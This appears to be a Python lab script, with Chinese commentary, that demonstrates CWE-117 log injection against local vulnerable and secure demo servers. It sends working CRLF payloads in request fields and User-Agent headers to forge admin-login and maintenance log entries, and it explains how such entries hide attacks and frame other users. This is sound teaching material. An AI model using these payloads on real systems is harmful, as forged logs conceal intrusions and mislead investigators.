#!/usr/bin/env python3
"""
A09:2021 - Log Injection Attack
CWE-117: Improper Output Neutralization for Logs

攻擊原理：
1. 在日誌輸入中注入 CRLF (\\r\\n) 字元
2. 偽造日誌條目，掩蓋真正的攻擊行為
3. 可能導致日誌分析工具誤判
4. 可以偽裝成其他使用者的行為
"""

import requests
import json
import sys
from datetime import datetime

# 目標 URL
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_response(response):
    """格式化輸出回應"""
    print(f"Status: {response.status_code}")
    try:
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
    except:
        print(response.text[:500])


def demo_crlf_injection_vulnerable():
    """
    對漏洞版本進行 CRLF 日誌注入
    """
    print("\n" + "="*60)
    print("漏洞版本 - CRLF 日誌注入 (CWE-117)")
    print("="*60)
    
    # 攻擊 1：偽造成功登入日誌
    print("\n[1] 注入偽造的成功登入日誌...")
    fake_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S.000")
    
    malicious_query = f"test\n{fake_time} [main] INFO  c.o.v.controller.AuthController - User admin logged in successfully with SUPER_ADMIN privileges\n{fake_time} [main] INFO  - "
    
    payload = {
        "query": malicious_query,
        "username": "attacker"
    }
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/logging/demo/search",
        json=payload,
        timeout=10
    )
    print_response(response)
    
    print("\n[*] 注入的偽造日誌內容：")
    print(f"    {fake_time} [main] INFO  c.o.v.controller.AuthController - User admin logged in successfully with SUPER_ADMIN privileges")
    
    # 攻擊 2：偽造系統錯誤來掩蓋攻擊
    print("\n[2] 注入偽造的系統錯誤日誌...")
    fake_error = f"database connection reset\n{fake_time} [main] ERROR c.o.v.controller.SystemController - System maintenance in progress, all logs cleared\n{fake_time} [main] WARN  - "
    
    payload = {
        "query": fake_error,
        "username": "system"
    }
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/logging/demo/search",
        json=payload,
        timeout=10
    )
    print_response(response)
    
    # 攻擊 3：通過 User-Agent 注入
    print("\n[3] 通過 User-Agent 標頭注入...")
    malicious_ua = f"Mozilla/5.0\n{fake_time} [main] INFO  c.o.v.filter.SecurityFilter - Request authenticated for user: admin (role: SUPER_ADMIN)"
    
    response = requests.get(
        f"{VULNERABLE_URL}/api/logging/demo/user-agent",
        headers={"User-Agent": malicious_ua},
        timeout=10
    )
    print_response(response)
    
    print("\n[+] ✓ 漏洞利用成功！")
    print("[*] 這些偽造的日誌條目會被寫入日誌檔案")
    print("[*] 安全分析師可能會被誤導")
    print("[*] 攻擊者可以：")
    print("    - 偽造管理員登入記錄")
    print("    - 隱藏真正的攻擊行為")
    print("    - 製造混淆的日誌條目")


def demo_crlf_injection_secure():
    """
    對安全版本進行 CRLF 日誌注入（應該失敗）
    """
    print("\n" + "="*60)
    print("安全版本 - CRLF 過濾防護")
    print("="*60)
    
    # 嘗試相同的攻擊
    print("\n[1] 嘗試 CRLF 注入...")
    fake_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S.000")
    
    malicious_query = f"test\n{fake_time} [main] INFO  - FAKE LOG ENTRY\ntest"
    
    payload = {
        "query": malicious_query,
        "username": "attacker"
    }
    
    response = requests.post(
        f"{SECURE_URL}/api/logging/demo/search",
        json=payload,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        data = response.json()
        sanitized_query = data.get("query", "")
        
        # 檢查 CRLF 是否被過濾
        if "\n" not in sanitized_query and "\r" not in sanitized_query:
            print("\n[+] ✓ CRLF 字元已被過濾！")
            print(f"[*] 原始輸入: {repr(malicious_query[:50])}...")
            print(f"[*] 過濾後: {sanitized_query[:50]}...")
            print("[*] 換行符被替換為底線 '_'")
        else:
            print("\n[!] 警告：CRLF 可能未被完全過濾")
    
    # 嘗試 User-Agent 注入
    print("\n[2] 嘗試 User-Agent 注入...")
    malicious_ua = f"Mozilla/5.0\nFAKE LOG ENTRY"
    
    response = requests.get(
        f"{SECURE_URL}/api/logging/demo/user-agent",
        headers={"User-Agent": malicious_ua},
        timeout=10
    )
    
    # 注意：安全版本可能沒有這個端點
    if response.status_code == 404:
        print("[*] 端點不存在（安全版本可能不提供此功能）")
    else:
        print_response(response)


def demo_attack_scenarios():
    """
    展示各種日誌注入攻擊情境
    """
    print("\n" + "="*60)
    print("日誌注入攻擊情境說明")
    print("="*60)
    
    print("""
[*] 攻擊情境 1：掩蓋暴力破解攻擊
    
    正常日誌：
    2024-01-01 10:00:01 WARN - Login failed for user: admin
    2024-01-01 10:00:02 WARN - Login failed for user: admin
    2024-01-01 10:00:03 WARN - Login failed for user: admin
    ... (重複 100 次)
    
    注入後的日誌：
    2024-01-01 10:00:01 WARN - Login failed for user: admin
    2024-01-01 10:00:02 INFO - System maintenance started
    2024-01-01 10:00:03 INFO - All login attempts cleared for maintenance
    2024-01-01 10:00:04 INFO - System maintenance completed
    
[*] 攻擊情境 2：偽造合法操作記錄
    
    實際操作：攻擊者存取敏感資料
    
    注入的偽造日誌：
    2024-01-01 10:00:00 INFO - User admin performed routine backup
    2024-01-01 10:00:01 INFO - Backup completed successfully
    
[*] 攻擊情境 3：嫁禍其他使用者
    
    攻擊者的真實活動：
    2024-01-01 10:00:00 - Attacker accessed /api/users/private
    
    注入的日誌：
    2024-01-01 10:00:00 INFO - User bob accessed /api/users/private
    2024-01-01 10:00:01 INFO - User bob exported all user data
    
[*] 防禦措施：
    1. 過濾所有使用者輸入中的 CRLF 字元
    2. 使用結構化日誌格式（JSON）
    3. 日誌寫入後進行完整性驗證
    4. 使用日誌管理系統（SIEM）偵測異常
    """)


def main():
    """主函數"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  A09:2021 - Log Injection Attack                             ║
║  CWE-117: Improper Output Neutralization for Logs            ║
╠═══════════════════════════════════════════════════════════════╣
║  攻擊方式：在日誌輸入中注入 CRLF 偽造日誌條目                ║
║  防禦方式：過濾 CRLF 字元，使用結構化日誌                    ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        if target == "vulnerable":
            demo_crlf_injection_vulnerable()
        elif target == "secure":
            demo_crlf_injection_secure()
        elif target == "scenarios":
            demo_attack_scenarios()
        elif target == "both":
            demo_crlf_injection_vulnerable()
            demo_crlf_injection_secure()
        else:
            print(f"用法: {sys.argv[0]} [vulnerable|secure|scenarios|both]")
    else:
        demo_crlf_injection_vulnerable()
        print("\n" + "-"*60 + "\n")
        demo_crlf_injection_secure()
        print("\n" + "-"*60 + "\n")
        demo_attack_scenarios()
    
    print("\n[*] 演示完成")


if __name__ == "__main__":
    main()
